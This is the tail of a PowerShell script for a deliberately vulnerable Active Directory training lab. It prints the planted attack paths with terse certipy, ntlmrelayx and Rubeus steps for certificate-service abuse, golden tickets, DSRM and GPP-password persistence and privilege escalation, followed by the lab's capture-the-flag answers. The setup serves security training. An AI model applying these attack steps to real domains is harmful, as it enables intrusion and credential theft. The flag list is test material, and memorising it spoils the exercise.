Write-Host "      ESC3  : certipy req -template ESC3-EnrollAgent -> then enroll on-behalf-of Administrator"
Write-Host "      ESC4  : certipy template -template ESC4-Writable -save-old -> modify -> ESC1 attack"
Write-Host "      ESC6  : EDITF_ATTRIBUTESUBJECTALTNAME2 enabled -> -upn works on ANY template"
Write-Host "      ESC7  : noura.ahmed is CA Manager -> certipy ca -enable-template SubCA -> full CA compromise"
Write-Host "      ESC8  : ntlmrelayx.py -t http://$DCHostname/certsrv/certfnsh.asp --adcs"

Write-Host "`n  [8] PERSISTENCE" -ForegroundColor Red
Write-Host "      AdminSDHolder : svc_backup GenericAll -> affects all DA accounts after SDProp (60 min)"
Write-Host "      DSRM          : DsrmAdminLogonBehavior=2 -> dump SAM -> PTH as local DC admin"
Write-Host "      Golden Ticket : After getting krbtgt (via DCSync/svc_backup) -> Rubeus golden"
Write-Host "      GPP Password  : Groups.xml in SYSVOL with encrypted p@ssw0rd"

Write-Host "`n  [9] LOCAL PRIVILEGE ESCALATION" -ForegroundColor Red
Write-Host "      AlwaysInstallElevated : GPO linked to domain -> any MSI runs as SYSTEM"
Write-Host "      Nested Groups         : Helpdesk -> Server Operators -> log on locally to DC"

Write-Host "`n  [10] FLAGS" -ForegroundColor Red
Write-Host "      noura.ahmed     description  : flag{it_enum_noura_crtp}"
Write-Host "      reem.sultan     description  : flag{hr_description_enum_crtp}"
Write-Host "      walid.saeed     description  : flag{asrep_walid_crtp}"
Write-Host "      lina.script     description  : flag{asrep_lina_crtp}"
Write-Host "      svc_backup      description  : flag{kerberoast_backup_crte}"
Write-Host "      contractor.mutaeb description : flag{asrep_contractor_crtp}"
Write-Host "      old.admin       description  : flag{disabled_old_admin}"
Write-Host "      faisal.omar     info attr    : flag{ldap_info_faisal_crtp}"
Write-Host "      svc_backup      extAttr1     : flag{dcsync_backup_crte}"
Write-Host "      svc_sql         extAttr1     : flag{kerberoast_sql_crte}"

Write-Host "`n=================================================================" -ForegroundColor Cyan
Write-Host " REMINDER: Internal lab only. Run Setup-DevCorpLocal.ps1 on DC-02." -ForegroundColor Yellow
Write-Host "=================================================================`n" -ForegroundColor Cyan

#endregion
